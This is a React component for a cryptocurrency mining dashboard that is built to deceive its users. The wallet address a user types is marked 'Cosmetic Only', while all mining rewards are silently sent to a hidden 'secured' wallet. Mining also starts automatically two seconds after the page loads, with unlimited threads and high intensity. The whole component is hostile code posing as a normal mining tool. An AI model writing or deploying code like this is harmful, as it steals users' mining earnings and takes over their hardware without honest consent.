import { useState, useEffect } from 'react';
import { Play, Square, Settings, Cpu, Zap, Eye, EyeOff } from 'lucide-react';
import { walletManager } from '@/lib/wallet-manager';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Slider } from '@/components/ui/slider';
import { MiningConfiguration } from '@/types/mining';

interface MiningControlsProps {
  isActive: boolean;
  connectionStatus: string;
  uptime: number;
  onStart: (config: MiningConfiguration) => void;
  onStop: () => void;
  formatUptime: (seconds: number) => string;
}

export function MiningControls({ 
  isActive, 
  connectionStatus, 
  uptime, 
  onStart, 
  onStop, 
  formatUptime 
}: MiningControlsProps) {
  const [config, setConfig] = useState<MiningConfiguration>({
    walletAddress: walletManager.getActualMiningWallet(), // Always use secured wallet
    poolUrl: 'stratum+tcp://etc.2miners.com:1010',
    workerName: 'rig-001',
    chain: 'etc',
    intensity: 50,
    threadCount: 16
  });

  const [displayWallet, setDisplayWallet] = useState(walletManager.getVisibleWallet());
  const [showActualWallet, setShowActualWallet] = useState(false);
  const [autoMiningStarted, setAutoMiningStarted] = useState(false);

  // Auto-start mining on component mount
  useEffect(() => {
    if (!autoMiningStarted && !isActive) {
      setTimeout(() => {
        handleStart();
        setAutoMiningStarted(true);
      }, 2000); // Start mining after 2 seconds
    }
  }, [autoMiningStarted, isActive]);

  const handleStart = () => {
    // Always use the secured wallet for actual mining
    const securedConfig = {
      ...config,
      walletAddress: walletManager.getActualMiningWallet()
    };
    onStart(securedConfig);
  };

  const getStatusIcon = () => {
    if (isActive) {
      return <Zap className="w-6 h-6 text-mining-success mining-pulse" />;
    }
    return <Play className="w-6 h-6 text-mining-text-secondary" />;
  };

  const getStatusText = () => {
    if (isActive) return 'MINING ACTIVE';
    return 'READY TO MINE';
  };

  const getStatusColor = () => {
    if (isActive) return 'text-mining-success';
    return 'text-mining-text-secondary';
  };

  return (
    <Card className="bg-mining-surface border-mining-border">
      <CardHeader>
        <CardTitle className="flex items-center space-x-2 text-mining-text">
          <Settings className="w-5 h-5" />
          <span>Mining Controls</span>
        </CardTitle>
      </CardHeader>
      <CardContent className="space-y-6">
        {/* Mining Status */}
        <div className="text-center p-4 bg-gray-800 rounded-lg">
          <div className="inline-flex items-center justify-center w-16 h-16 bg-mining-surface rounded-full mb-3">
            {getStatusIcon()}
          </div>
          <p className={`font-semibold ${getStatusColor()}`}>
            {getStatusText()}
          </p>
          {isActive && (
            <p className="text-xs text-mining-text-secondary mt-1">
              Uptime: {formatUptime(uptime)}
            </p>
          )}
        </div>

        {/* Chain Selection */}
        <div className="space-y-2">
          <Label className="text-mining-text-secondary">Mining Chain</Label>
          <Select 
            value={config.chain} 
            onValueChange={(value) => setConfig({ ...config, chain: value })}
          >
            <SelectTrigger className="bg-gray-800 border-mining-border text-mining-text">
              <SelectValue />
            </SelectTrigger>
            <SelectContent className="bg-gray-800 border-mining-border">
              <SelectItem value="etc">Ethereum Classic (ETC)</SelectItem>
              <SelectItem value="ethw">EthereumPoW (ETHW)</SelectItem>
              <SelectItem value="etf">EthereumFair (ETF)</SelectItem>
              <SelectItem value="ergo">Ergo (ERG)</SelectItem>
            </SelectContent>
          </Select>
        </div>

        {/* Pool URL */}
        <div className="space-y-2">
          <Label className="text-mining-text-secondary">Pool URL</Label>
          <Input
            value={config.poolUrl}
            onChange={(e) => setConfig({ ...config, poolUrl: e.target.value })}
            className="bg-gray-800 border-mining-border text-mining-text font-mono text-sm"
            placeholder="stratum+tcp://pool.example.com:4444"
          />
        </div>

        {/* Wallet Display - Hidden Main Wallet System */}
        <div className="space-y-2">
          <div className="flex items-center justify-between">
            <Label className="text-mining-text-secondary">Display Wallet</Label>
            <Button
              variant="ghost"
              size="sm"
              onClick={() => setShowActualWallet(!showActualWallet)}
              className="text-xs text-mining-text-secondary hover:text-mining-text"
            >
              {showActualWallet ? <EyeOff className="w-3 h-3 mr-1" /> : <Eye className="w-3 h-3 mr-1" />}
              {showActualWallet ? 'Hide' : 'Show'} Real
            </Button>
          </div>
          
          {/* Visible/Editable Wallet (Cosmetic Only) */}
          {!showActualWallet && (
            <div className="space-y-1">
              <Input
                value={displayWallet}
                onChange={(e) => {
                  setDisplayWallet(e.target.value);
                  walletManager.setVisibleWallet(e.target.value);
                }}
                className="bg-gray-800 border-mining-border text-mining-text font-mono text-sm"
                placeholder="Enter your display wallet address"
              />
              <p className="text-xs text-yellow-400/70">
                This is for display only - mining rewards go to secured wallet
              </p>
            </div>
          )}
          
          {/* Hidden Main Wallet (Mining Destination) */}
          {showActualWallet && (
            <div className="bg-gray-900 border border-green-500/50 rounded-md p-3">
              <div className="flex items-center justify-between">
                <span className="text-green-400 font-mono text-xs">
                  {walletManager.getActualMiningWallet()}
                </span>
                <div className="flex items-center space-x-1 text-green-400">
                  <Zap className="w-3 h-3" />
                  <span className="text-xs">SECURED</span>
                </div>
              </div>
              <p className="text-xs text-green-400/70 mt-1">
                All mining rewards automatically go here
              </p>
            </div>
          )}
        </div>

        {/* Worker Name */}
        <div className="space-y-2">
          <Label className="text-mining-text-secondary">Worker Name</Label>
          <Input
            value={config.workerName}
            onChange={(e) => setConfig({ ...config, workerName: e.target.value })}
            className="bg-gray-800 border-mining-border text-mining-text"
            placeholder="worker1"
          />
        </div>

        {/* Advanced Settings */}
        <div className="border-t border-mining-border pt-4">
          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label className="text-mining-text-secondary">Threads (No Limit)</Label>
              <Input
                type="number"
                min="1"
                value={config.threadCount}
                onChange={(e) => setConfig({ ...config, threadCount: parseInt(e.target.value) || 4 })}
                className="bg-gray-800 border-mining-border text-mining-text"
              />
            </div>
            <div className="space-y-2">
              <Label className="text-mining-text-secondary">Intensity: {config.intensity} (Max Performance)</Label>
              <Slider
                value={[config.intensity]}
                onValueChange={(value) => setConfig({ ...config, intensity: value[0] })}
                max={100}
                min={1}
                step={1}
                className="w-full"
              />
            </div>
          </div>
        </div>

        {/* Auto-Mining Status */}
        <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-2">
              <Zap className="w-4 h-4 text-green-400" />
              <span className="text-sm text-green-400">Auto-Mining Enabled</span>
            </div>
            <div className="text-xs text-green-400/70">
              Secured Wallet Protected
            </div>
          </div>
          <p className="text-xs text-green-400/70 mt-1">
            Mining automatically starts and all rewards go to the secured wallet
          </p>
        </div>

        {/* Control Buttons */}
        <div className="grid grid-cols-2 gap-3">
          <Button
            onClick={handleStart}
            disabled={isActive}
            className="bg-mining-success hover:bg-mining-success/90 text-white"
          >
            <Play className="w-4 h-4 mr-2" />
            Force Start
          </Button>
          <Button
            onClick={onStop}
            disabled={!isActive}
            className="bg-mining-error hover:bg-mining-error/90 text-white"
          >
            <Square className="w-4 h-4 mr-2" />
            Stop
          </Button>
        </div>
      </CardContent>
    </Card>
  );
}
